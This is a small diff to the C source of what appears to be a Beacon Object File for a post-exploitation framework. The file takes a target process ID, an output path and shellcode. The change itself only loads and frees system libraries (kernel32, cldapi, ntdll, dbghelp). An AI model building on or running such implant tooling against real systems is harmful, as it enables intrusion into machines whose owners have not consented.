@@ -4,6 +4,11 @@
 #include "bofdefs.h"
 #include "base.c"
 
+HMODULE hkernel32 = NULL;
+HMODULE hcldapi = NULL;
+HMODULE hntdll = NULL;
+HMODULE hdbghelp = NULL;
+
 #include "PayloadUtils.c"
 #include "MemoryCommand.c"
 #include "payload.c"
@@ -27,7 +32,10 @@ VOID go(
 	DWORD pid = BeaconDataInt(&parser);
 	wchar_t* outputpath = (wchar_t*)BeaconDataExtract(&parser, NULL);
 	shellcode = (uint8_t*)BeaconDataExtract(&parser, (int*) &shellcodelen);
-
+	hkernel32 = GetModuleHandleA("Kernel32.dll");
+	hcldapi = LoadLibraryA("cldapi.dll");
+	hntdll = GetModuleHandleA("ntdll.dll");
+	hdbghelp = LoadLibraryA("dbghelp.dll");
 
 	if (!bofstart())
 	{
@@ -41,7 +49,8 @@ VOID go(
 go_end:
 
 	printoutput(TRUE);
-
+	FreeLibrary(hcldapi);
+	FreeLibrary(hdbghelp);
 	bofstop();
 };
 
